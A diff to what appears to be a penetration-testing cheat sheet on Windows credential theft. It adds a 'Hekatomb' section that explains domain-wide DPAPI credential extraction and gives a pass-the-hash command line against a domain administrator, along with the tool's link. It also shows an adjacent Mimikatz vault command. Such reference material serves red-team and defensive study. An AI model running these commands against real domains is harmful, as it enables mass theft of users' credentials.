@@ -14,6 +14,7 @@
   * [Chrome Cookies & Credential](#chrome-cookies--credential)
   * [Task Scheduled credentials](#task-scheduled-credentials)
   * [Vault](#vault)
+* [Hekatomb - Steal all credentials on domain](#hekatomb---Steal-all-credentials-on-domain)
 * [Mimikatz - Commands list](#mimikatz---commands-list)
 * [Mimikatz - Powershell version](#mimikatz---powershell-version)
 * [References](#references)
@@ -234,6 +235,22 @@ Attributes : 0
 ```powershell
 vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 ```
+
+### Hekatomb - Steal all credentials on domain
+
+> Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations.
+
+> Then it will download all DPAPI blob of all users from all computers.
+
+> Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.
+
+```python
+python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
+```
+
+<a href="https://github.com/Processus-Thief/HEKATOMB">https://github.com/Processus-Thief/HEKATOMB</a>
+
+![Data in memory](https://docs.lestutosdeprocessus.fr/hekatomb.png)
 
 
 ## Mimikatz - Commands list
